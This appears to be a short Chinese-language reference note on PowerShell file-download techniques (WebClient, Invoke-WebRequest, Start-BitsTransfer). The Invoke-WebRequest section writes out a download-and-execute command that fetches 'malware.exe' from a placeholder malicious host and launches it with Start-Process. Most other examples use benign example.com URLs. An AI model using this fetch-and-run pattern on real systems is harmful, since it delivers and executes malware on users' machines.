### System.Net.WebClient类
`WebClient` 是 .NET 框架中的类，用于在网络上进行数据传输。`WebClient` 提供了简便的方法来执行常见的网络操作，例如上传或下载文件。
```
$client = New-Object System.Net.WebClient
$client.DownloadFile("https://example.com/file.zip", "C:\path\to\file.zip")
```
`WebClient` 类的 `DownloadFile` 方法会直接从指定的 URL 下载文件，并将其保存到本地文件系统。与 `Invoke-WebRequest` 类似，但语法更加简洁，适合用于下载文件。

###  Invoke-WebRequest命令
```
Invoke-WebRequest -Uri "http://maliciousurl.com/malware.exe" -OutFile "C:\Temp\malware.exe"
Start-Process "C:\Temp\malware.exe"
```
通过 `Invoke-WebRequest` 从远程服务器下载恶意可执行文件，然后通过 `Start-Process` 启动它。

- 需要管理员权限才能执行一些下载操作到系统目录或者启动程序。
- 如果用户权限较低，可能无法下载到受保护的目录（如 `C:\Program Files`），但可以选择其他位置。

### Start-BitsTransfer类
`Start-BitsTransfer` 是 PowerShell 中的一种命令，通常用于将文件从本地系统传输到远程系统或从远程系统下载文件。它是利用后台智能传输服务（BITS）来传输文件。
```
Start-BitsTransfer -Source "https://example.com/file.zip" -Destination "C:\path\to\file.zip"

```
`Start-BitsTransfer` 会使用 BITS（Background Intelligent Transfer Service）进行文件传输，适合于需要下载大文件并且能够容忍传输在后台进行的情况。它特别适用于通过较慢或不稳定的网络进行文件下载，因为它支持断点续传。